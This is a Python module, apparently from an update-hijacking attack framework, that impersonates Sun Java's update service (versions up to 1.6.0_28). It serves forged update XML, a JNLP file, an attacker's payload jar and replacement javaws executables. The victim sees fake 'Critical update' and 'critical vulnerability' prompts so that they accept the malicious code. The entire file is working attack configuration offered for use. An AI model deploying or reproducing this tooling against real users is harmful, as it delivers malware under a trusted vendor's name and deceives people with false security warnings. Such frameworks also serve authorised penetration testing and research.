from modules import ModuleBase


class SunMicrosystemsJava(ModuleBase):
    name = 'Sun Microsystems Java'
    version = '1.0'
    appver = '<= 1.6.0_28'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(java.sun.com|javadl-esd.sun.com)'
    agent_filename = './include/sunjava/JavaPayload/FunnyClass2.jar'
    options = {
        'arg': {
            'val': 'http://java.sun.com/x.jnlp"',
            'desc': 'Arg passed to Agent'
        },
        'name': {
            'val' : "'javaupdate' + rand_alpha(rand_num(1))",
            'hidden': 1,
            'dynamic': 1,
        },
        'title': {
            'val': 'Critical update',
            'desc': 'Title name displayed in the update'
        },
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'atitle': {
            'val': 'Critical vulnerability',
            'desc': 'Title name to be displayed in the systray item popup'
        },
        'adescription': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description  to be displayed in the systray item popup'
        },
        'website': {
            'val': 'http://java.com/moreinfolink',
            'desc': 'Website displayed in the update'
        }
    }
    requests = [{
            'path': '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '',
            'file': './include/sunjava/sunjava_map.xml'
        }, {
            'path': '^/java_update.xml$',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/sunjava/sunjava_update.xml'
        }, {
            'path': '^/java_update_seven.xml$',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/sunjava/sunjava_update_seven.xml'
        }, {
            'path': '/x.jnlp',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/sunjava/x.jnlp'
        }, {
            'path': '.jar',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '',
            'file': ''
        }, {
            'path': '_seven.exe',
            'type': 'file',
            'bin': 1,
            'method': '',
            'string': '',
            'parse': '',
            'file': './agent/java/javaws_seven.exe'
        }, {
            'path': '.exe',
            'type': 'file',
            'bin': 1,
            'method': '',
            'string': '',
            'parse': '',
            'file': './agent/java/javaws.exe'
        }]

